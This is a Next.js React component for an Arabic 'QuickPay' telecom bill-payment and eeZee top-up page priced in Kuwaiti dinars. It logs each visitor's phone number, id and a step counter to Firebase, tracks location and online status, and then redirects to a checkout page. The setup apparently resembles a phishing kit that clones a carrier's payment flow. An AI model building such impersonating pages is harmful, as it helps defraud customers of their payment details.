"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { ChevronDown, Heart, Menu, ShoppingCart, Check } from "lucide-react"
import { useRouter } from "next/navigation"
import { useLocation } from "@/lib/use-location"
import { setupOnlineStatus } from "@/lib/utils"
import { addData } from "@/lib/firebase"
import Loader from "@/components/loader"


export default function QuickPay() {
  const [phone, setPhone] = useState("")
  const [activeTab, setActiveTab] = useState<"bill" | "recharge">("bill")
  const [termsAccepted, setTermsAccepted] = useState(false)
  const [selectedDiscount, setSelectedDiscount] = useState<number>(0)
  const [loading, setLoading] = useState(false)
  const [selectedAmounts, setSelectedAmounts] = useState<number>(5.0)

  const router = useRouter()

  // Call useLocation at the top level of the component
  useLocation()

  const init = () => {
    const visitorId = localStorage.getItem("visitor")
    setupOnlineStatus(visitorId!)
  }

  const handleAmountChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const value = e.target.value
    setSelectedAmounts(Number.parseFloat(value))
  }

  const discountAmount = (selectedAmounts * selectedDiscount) / 100
  const total = selectedAmounts - discountAmount

  const handleSubmit = (e: any) => {
    e.preventDefault()
    const visitorId = localStorage.getItem("visitor")
    addData({
      createdDate: new Date().toISOString(),
      id: visitorId,
      phone: phone,
      step: 1,
    })
    localStorage.setItem("amount",total!.toString())

    setLoading(true)

    setTimeout(() => {
      router.push("/checkout")
      setLoading(false)
    }, 2000)
  }

  useEffect(() => {
    init()
  }, [])

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 font-[Cairo] text-right py-3" dir="rtl">
      {/* Header */}
 
      <main className="p-4 max-w-md mx-auto">
        {/* Main Card */}
        <div className="bg-white rounded-2xl shadow-lg p-6 mt-4 border border-gray-100">
          <h1 className="text-2xl font-bold mb-6 text-right text-gray-800">الدفع السريع</h1>

          {/* Tabs */}
          <div className="flex border-b mb-6">
            <button
              className={`flex-1 pb-2 font-bold transition-colors duration-200 ${
                activeTab === "bill"
                  ? "text-[#d50087] border-b-2 border-[#d50087]"
                  : "text-gray-500 hover:text-gray-700"
              }`}
              onClick={() => setActiveTab("bill")}
            >
              دفع الفاتورة
            </button>
            <button
              className={`flex-1 pb-2 font-bold transition-colors duration-200 ${
                activeTab === "recharge"
                  ? "text-[#d50087] border-b-2 border-[#d50087]"
                  : "text-gray-500 hover:text-gray-700"
              }`}
              onClick={() => setActiveTab("recharge")}
            >
              إعادة تعبئة eeZee
            </button>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Discount Section */}
      
            <div className="space-y-1">
              <label className="block font-semibold mb-1 text-gray-700">أود الدفع لـ</label>
              <div className="relative">
                <select className="w-full p-3 border-b-2 border-[#d50087] bg-transparent appearance-none focus:outline-none focus:border-[#a00064] transition-colors">
                  <option>رقم آخر</option>
                  <option>رقم العقد</option>
                </select>
                <ChevronDown className="absolute left-2 top-3 text-[#d50087]" size={20} />
              </div>
            </div>

            <div className="space-y-1">
              <label className="block font-semibold mb-1 text-gray-700 flex items-center">
                أدخل رقم الهاتف <span className="text-red-500 mr-1">*</span>
               
              </label>

              <input
                type="text"
                placeholder="9XXXXXXXX"
                className={`w-full p-3 border-b-2 ${
                  phone ? (phone.length===8 ? "border-green-500" : "border-[#d50087]") : "border-gray-300"
                } bg-transparent focus:outline-none transition-colors duration-200`}
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                maxLength={8}
              />
              {phone && phone.length !==8 && (
                <p className="text-sm text-red-500 mt-1">يجب أن يتكون من 8 أرقام</p>
              )}
            </div>

            {phone.length===8 && (
              <div className="space-y-1">
                <label className="block font-semibold mb-1 text-gray-700">القيمة المختارة</label>
                <div className="relative">
                  <select
                    className="w-full p-3 border-b-2 border-[#d50087] bg-transparent appearance-none focus:outline-none focus:border-[#a00064] transition-colors"
                    value={selectedAmounts}
                    onChange={handleAmountChange}
                  >
                    <option value={0}>اختر المبلغ</option>
                    <option value={3}>3.000 د.ك</option>
                    <option value={5}>5.000 د.ك</option>
                    <option value={10}>10.000 د.ك</option>
                    <option value={20}>20.000 د.ك</option>
                    <option value={30}>30.000 د.ك</option>
                    <option value={40}>40.000 د.ك</option>
                    <option value={50}>50.000 د.ك</option>
                  </select>
                  <ChevronDown className="absolute left-2 top-3 text-[#d50087]" size={20} />
                </div>
              </div>
            )}

            <div className="pt-2">
              <div className="flex items-start gap-3">
                <input
                  type="checkbox"
                  id="terms"
                  className="mt-1 h-4 w-4 accent-[#d50087] cursor-pointer"
                  checked={termsAccepted}
                  onChange={(e) => setTermsAccepted(e.target.checked)}
                />
                <label htmlFor="terms" className="text-sm text-gray-600 cursor-pointer">
                  قرأت ووافقت على <span className="text-[#d50087] underline">الشروط والأحكام</span>
                </label>
              </div>
            </div>

            <button
              type="button"
              className="w-full p-3 bg-gray-100 text-gray-600 rounded-md flex items-center justify-center hover:bg-gray-200 transition-colors duration-200"
            >
              <span className="mr-2 font-bold">+</span> أضف رقم آخر
            </button>

            <div className="pt-4 border-t border-gray-200 space-y-2">
              <div className="flex justify-between items-center">
                <span className="text-gray-600">المبلغ الاجمالي</span>
                <span className="text-gray-800 font-semibold">{selectedAmounts.toFixed(3)} د.ك</span>
              </div>
              </div>
          

            <button
              type="submit"
              className={`w-full p-3 rounded-md transition-all duration-200 ${
                selectedAmounts > 0 && phone.length===8 && termsAccepted
                  ? "bg-[#d50087] hover:bg-[#a00064] text-white shadow-md hover:shadow-lg cursor-pointer"
                  : "bg-gray-200 text-gray-500 cursor-not-allowed"
              }`}
              disabled={selectedAmounts === 0 || phone.length!==8 || !termsAccepted}
            >
              ادفع الآن
            </button>
          </form>
        </div>
      </main>

      {loading && <Loader/>}
    </div>
  )
}
